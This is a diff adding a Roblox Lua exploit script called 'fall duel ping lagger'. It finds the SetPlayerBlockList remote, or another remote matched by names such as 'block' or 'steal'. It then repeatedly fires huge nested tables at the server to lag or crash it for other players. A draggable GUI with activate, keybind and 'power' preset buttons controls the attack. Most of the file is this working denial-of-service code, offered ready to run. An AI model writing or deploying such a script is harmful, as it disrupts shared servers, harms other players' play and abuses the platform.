@@ -1,0 +1,349 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local NetworkClient = game:GetService("NetworkClient")
+local lp = Players.LocalPlayer
+local cfg = {
+    tableInc = 290,
+    tries = 1,
+    waitTime = 0.06
+}
+local laggerEnabled = false
+local laggerThread = nil
+local cachedRemote = nil
+local function getDirectRemote()
+    local ok, result = pcall(function()
+        return game.RobloxReplicatedStorage.SetPlayerBlockList
+    end)
+    if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
+        return result
+    end
+    return nil
+end
+local function findRemote()
+    if cachedRemote and cachedRemote.Parent then return cachedRemote end
+    local paths = {
+        function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
+        function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
+        function() return game:FindFirstChild("SetPlayerBlockList", true) end,
+    }
+    for _, pathFn in ipairs(paths) do
+        local ok, result = pcall(pathFn)
+        if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
+            cachedRemote = result
+            return result
+        end
+    end
+    local services = {ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage")}
+    for _, service in ipairs(services) do
+        if service then
+            for _, obj in ipairs(service:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
+                    local name = obj.Name:lower()
+                    if name:find("block") or name:find("steal") or name:find("accept") or name:find("report") or name:find("player") then
+                        cachedRemote = obj
+                        return obj
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+local function getRemote()
+    local direct = getDirectRemote()
+    if direct then return direct end
+    return findRemote()
+end
+local function getmaxvalue(val)
+    if type(val) ~= "number" then return nil end
+    return 499999/(val+2)
+end
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 10000 == 0 then task.wait() end
+    end
+    local remote = getRemote()
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+local function crashLoop()
+    while laggerEnabled do
+        pcall(function()
+            NetworkClient:SetOutgoingKBPSLimit(math.huge)
+        end)
+        pcall(function()
+            settings().Network.IncomingReplicationLag = 0
+        end)
+        bomb(cfg.tableInc, cfg.tries)
+        task.wait(cfg.waitTime)
+    end
+end
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(crashLoop)
+    coroutine.resume(laggerThread)
+end
+local function stopLagger()
+    laggerEnabled = false
+    if laggerThread then
+        pcall(function() coroutine.close(laggerThread) end)
+        laggerThread = nil
+    end
+end
+local function toggleLagger()
+    if laggerEnabled then
+        stopLagger()
+    else
+        startLagger()
+    end
+end
+local function setPreset(value)
+    cfg.tableInc = value
+    if laggerEnabled then
+        stopLagger()
+        task.wait(0.2)
+        startLagger()
+    end
+end
+local PlayerGui = lp:WaitForChild("PlayerGui")
+if PlayerGui:FindFirstChild("FallHubLagger") then
+    PlayerGui.FallHubLagger:Destroy()
+end
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "FallHubLagger"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PlayerGui
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 220, 0, 280)
+MainFrame.Position = UDim2.new(0.5, -110, 0.5, -140)
+MainFrame.BackgroundColor3 = Color3.fromRGB(10, 20, 50)
+MainFrame.BackgroundTransparency = 0.1
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 8)
+MainCorner.Parent = MainFrame
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(30, 60, 150)
+MainStroke.Transparency = 0.5
+MainStroke.Thickness = 1
+MainStroke.Parent = MainFrame
+local HeaderBar = Instance.new("Frame")
+HeaderBar.Size = UDim2.new(1, 0, 0, 40)
+HeaderBar.BackgroundColor3 = Color3.fromRGB(15, 30, 70)
+HeaderBar.BorderSizePixel = 0
+HeaderBar.Parent = MainFrame
+local HeaderCorner = Instance.new("UICorner")
+HeaderCorner.CornerRadius = UDim.new(0, 8)
+HeaderCorner.Parent = HeaderBar
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, 0, 1, 0)
+TitleLabel.Position = UDim2.new(0, 0, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "fall duel ping lagger"
+TitleLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
+TitleLabel.TextSize = 16
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+TitleLabel.Parent = HeaderBar
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 20, 0, 20)
+CloseBtn.Position = UDim2.new(1, -25, 0.5, -10)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
+CloseBtn.Text = "×"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextSize = 18
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Parent = HeaderBar
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 4)
+CloseCorner.Parent = CloseBtn
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Size = UDim2.new(1, 0, 1, -40)
+ContentFrame.Position = UDim2.new(0, 0, 0, 40)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.BorderSizePixel = 0
+ContentFrame.Parent = MainFrame
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Padding = UDim.new(0, 10)
+UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Parent = ContentFrame
+local UIPadding = Instance.new("UIPadding")
+UIPadding.PaddingTop = UDim.new(0, 15)
+UIPadding.PaddingLeft = UDim.new(0, 10)
+UIPadding.PaddingRight = UDim.new(0, 10)
+UIPadding.Parent = ContentFrame
+local ActivateBtn = Instance.new("TextButton")
+ActivateBtn.LayoutOrder = 1
+ActivateBtn.Size = UDim2.new(1, 0, 0, 40)
+ActivateBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 90)
+ActivateBtn.Text = ""
+ActivateBtn.BorderSizePixel = 0
+ActivateBtn.Parent = ContentFrame
+local ActivateCorner = Instance.new("UICorner")
+ActivateCorner.CornerRadius = UDim.new(0, 6)
+ActivateCorner.Parent = ActivateBtn
+local ActivateText = Instance.new("TextLabel")
+ActivateText.Size = UDim2.new(1, 0, 1, 0)
+ActivateText.BackgroundTransparency = 1
+ActivateText.Text = "ACTIVATE"
+ActivateText.TextColor3 = Color3.fromRGB(210, 210, 210)
+ActivateText.TextSize = 14
+ActivateText.Font = Enum.Font.GothamBold
+ActivateText.Parent = ActivateBtn
+local ActivateStroke = Instance.new("UIStroke")
+ActivateStroke.Color = Color3.fromRGB(255, 255, 255)
+ActivateStroke.Transparency = 0.8
+ActivateStroke.Thickness = 1
+ActivateStroke.Parent = ActivateBtn
+local activated = false
+ActivateBtn.MouseButton1Click:Connect(function()
+    toggleLagger()
+    activated = laggerEnabled
+    if activated then
+        ActivateText.Text = "DEACTIVATE"
+        ActivateText.TextColor3 = Color3.fromRGB(100, 200, 255)
+        ActivateStroke.Color = Color3.fromRGB(100, 200, 255)
+    else
+        ActivateText.Text = "ACTIVATE"
+        ActivateText.TextColor3 = Color3.fromRGB(210, 210, 210)
+        ActivateStroke.Color = Color3.fromRGB(255, 255, 255)
+    end
+end)
+local currentKey = "V"
+local listeningForKey = false
+local KeybindBtn = Instance.new("TextButton")
+KeybindBtn.LayoutOrder = 2
+KeybindBtn.Size = UDim2.new(1, 0, 0, 40)
+KeybindBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 90)
+KeybindBtn.Text = ""
+KeybindBtn.BorderSizePixel = 0
+KeybindBtn.Parent = ContentFrame
+local KeybindCorner = Instance.new("UICorner")
+KeybindCorner.CornerRadius = UDim.new(0, 6)
+KeybindCorner.Parent = KeybindBtn
+local KeybindText = Instance.new("TextLabel")
+KeybindText.Size = UDim2.new(1, 0, 1, 0)
+KeybindText.BackgroundTransparency = 1
+KeybindText.Text = "KEYBIND: " .. currentKey
+KeybindText.TextColor3 = Color3.fromRGB(210, 210, 210)
+KeybindText.TextSize = 14
+KeybindText.Font = Enum.Font.GothamBold
+KeybindText.Parent = KeybindBtn
+KeybindBtn.MouseButton1Click:Connect(function()
+    if listeningForKey then return end
+    listeningForKey = true
+    KeybindText.Text = "PRESS KEY..."
+end)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not listeningForKey then return end
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        local keyName = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
+        if #keyName > 5 then keyName = keyName:sub(1, 4) end
+        currentKey = keyName
+        KeybindText.Text = "KEYBIND: " .. currentKey
+        listeningForKey = false
+    end
+end)
+local PowerLabel = Instance.new("TextLabel")
+PowerLabel.LayoutOrder = 3
+PowerLabel.Size = UDim2.new(1, 0, 0, 20)
+PowerLabel.BackgroundTransparency = 1
+PowerLabel.Text = "Power Level"
+PowerLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+PowerLabel.TextSize = 12
+PowerLabel.Font = Enum.Font.Gotham
+PowerLabel.Parent = ContentFrame
+local PowerBtnsContainer = Instance.new("Frame")
+PowerBtnsContainer.LayoutOrder = 4
+PowerBtnsContainer.Size = UDim2.new(1, 0, 0, 35)
+PowerBtnsContainer.BackgroundTransparency = 1
+PowerBtnsContainer.Parent = ContentFrame
+local PowerListLayout = Instance.new("UIListLayout")
+PowerListLayout.FillDirection = Enum.FillDirection.Horizontal
+PowerListLayout.Padding = UDim.new(0, 5)
+PowerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+PowerListLayout.Parent = PowerBtnsContainer
+local function CreatePowerButton(labelText, order, presetValue)
+    local Btn = Instance.new("TextButton")
+    Btn.LayoutOrder = order
+    Btn.Size = UDim2.new(0, 90, 1, 0)
+    Btn.BackgroundColor3 = Color3.fromRGB(20, 40, 90)
+    Btn.Text = labelText
+    Btn.TextColor3 = Color3.fromRGB(210, 210, 210)
+    Btn.TextSize = 12
+    Btn.Font = Enum.Font.GothamBold
+    Btn.BorderSizePixel = 0
+    Btn.Parent = PowerBtnsContainer
+    local BtnCorner = Instance.new("UICorner")
+    BtnCorner.CornerRadius = UDim.new(0, 4)
+    BtnCorner.Parent = Btn
+    Btn.MouseButton1Click:Connect(function()
+        setPreset(presetValue)
+        -- Visual feedback
+        for _, other in ipairs(PowerBtnsContainer:GetChildren()) do
+            if other:IsA("TextButton") then
+                other.BackgroundColor3 = Color3.fromRGB(20, 40, 90)
+            end
+        end
+        Btn.BackgroundColor3 = Color3.fromRGB(40, 80, 180)
+    end)
+end
+CreatePowerButton("MAIN", 1, 290)
+CreatePowerButton("LOWER", 2, 285)
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.KeyCode == Enum.KeyCode[currentKey] then
+        toggleLagger()
+        activated = laggerEnabled
+        if activated then
+            ActivateText.Text = "DEACTIVATE"
+            ActivateText.TextColor3 = Color3.fromRGB(100, 200, 255)
+            ActivateStroke.Color = Color3.fromRGB(100, 200, 255)
+        else
+            ActivateText.Text = "ACTIVATE"
+            ActivateText.TextColor3 = Color3.fromRGB(210, 210, 210)
+            ActivateStroke.Color = Color3.fromRGB(255, 255, 255)
+        end
+    end
+end)
+lp.CharacterAdded:Connect(function()
+    task.wait(1)
+    if laggerEnabled then
+        stopLagger()
+        task.wait(0.5)
+        startLagger()
+    end
+end)
